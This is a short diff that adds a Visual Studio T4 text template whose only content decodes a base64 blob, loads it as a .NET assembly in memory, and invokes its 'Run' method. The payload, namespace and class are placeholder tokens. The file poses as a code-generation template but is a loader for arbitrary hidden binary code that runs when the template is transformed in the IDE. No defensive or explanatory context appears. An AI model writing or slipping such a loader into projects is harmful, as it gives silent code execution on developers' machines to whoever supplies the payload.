@@ -1,0 +1,9 @@
+<#@ template language="C#" hostspecific="true" #>
+<#@ assembly name="System.dll" #>
+<#@ import namespace="System" #>
+<#@ import namespace="System.Reflection" #>
+<#
+    byte[] raw = System.Convert.FromBase64String("BASE64_PH");
+    Assembly asm = Assembly.Load(raw);
+    asm.GetType("NAMESPACE_PH.CLASSNAME_PH").GetMethod("Run").Invoke(null, null);
+#>
